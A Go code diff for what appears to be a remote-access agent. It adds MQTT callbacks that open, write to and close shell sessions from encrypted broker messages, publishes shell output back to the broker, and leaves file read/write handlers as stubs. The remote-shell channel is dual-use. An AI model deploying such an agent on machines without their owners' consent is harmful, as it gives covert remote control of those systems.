@@ -4,6 +4,7 @@ import (
 	"fmt"
 
 	"./burat"
+	"./packets"
 	"io"
 	"crypto/rand"
 	"github.com/eclipse/paho.mqtt.golang"
@@ -55,13 +56,74 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 	})
 
 	burat.MqttConfig("tcp://localhost:1883")
+	burat.Connect()
 
 	burat.AddTopicCallback("remoteshell_cmd_open", func (client mqtt.Client, message mqtt.Message) {
+		var packet packets.RemoteShellOpenPacket
+		burat.Decryse(message.Payload(), &packet)
+		burat.Bushido().RemoteShell.Open(packet.Id, packet.Shell)
+	})
 
+	burat.AddTopicCallback("remoteshell_cmd_close", func (client mqtt.Client, message mqtt.Message) {
+		var packet packets.RemoteShellClosePacket
+		burat.Decryse(message.Payload(), &packet)
+		burat.Bushido().RemoteShell.Close(packet.Id)
+	})
+
+	burat.AddTopicCallback("remoteshell_cmd_write", func (client mqtt.Client, message mqtt.Message) {
+		var packet packets.RemoteShellWritePacket
+		burat.Decryse(message.Payload(), &packet)
+		burat.Bushido().RemoteShell.Write(packet.Id, packet.Data)
+	})
+
+	burat.AddTopicCallback("filerw_cmd_open", func (client mqtt.Client, message mqtt.Message) {
+		fmt.Println(message.Payload())
 		//packet := burat.Decryse(message.Payload)
 	})
 
-	burat.Connect()
+	burat.AddTopicCallback("filerw_cmd_close", func (client mqtt.Client, message mqtt.Message) {
+		fmt.Println(message.Payload())
+		//packet := burat.Decryse(message.Payload)
+	})
+
+	burat.AddTopicCallback("filerw_cmd_read", func (client mqtt.Client, message mqtt.Message) {
+		fmt.Println(message.Payload())
+		//packet := burat.Decryse(message.Payload)
+	})
+
+	burat.AddTopicCallback("filerw_cmd_write", func (client mqtt.Client, message mqtt.Message) {
+		fmt.Println(message.Payload())
+		//packet := burat.Decryse(message.Payload)
+	})
+
+	burat.Bushido().RemoteShell.OnOpen(func (id string) {
+		fmt.Println("remoteshell.open", id)
+		remoteshells := burat.Bushido().RemoteShell.RemoteShells()
+		for _, rs := range remoteshells {
+			if rs.Id() == id {
+				packet := burat.Seen(packets.RemoteShellOnOpenPacket{ Id: id, Shell: rs.Shell() })
+				burat.Publish(id, "remoteshell", 2, true, packet)
+			}
+		}
+	})
+
+	burat.Bushido().RemoteShell.OnClose(func (id string) {
+		fmt.Println("remoteshell.close", id)
+		burat.Publish(id, "remoteshell", 2, true, nil)
+	})
+
+	burat.Bushido().RemoteShell.OnRead(func (id string, data string) {
+		fmt.Println("remoteshell.read", id, data)
+		packet := burat.Seen(packets.RemoteShellOnReadPacket{ Id: id, Data: data })
+		burat.Publish(id, "remoteshell_evt_read", 2, false, packet)
+	})
+
+	burat.Bushido().RemoteShell.OnWrite(func (id string, data string) {
+		fmt.Println("remoteshell.write", id, data)
+		packet := burat.Seen(packets.RemoteShellOnWritePacket{ Id: id, Data: data })
+		burat.Publish(id, "remoteshell_evt_write", 2, false, packet)
+	})
+
 	for {
 
 	}
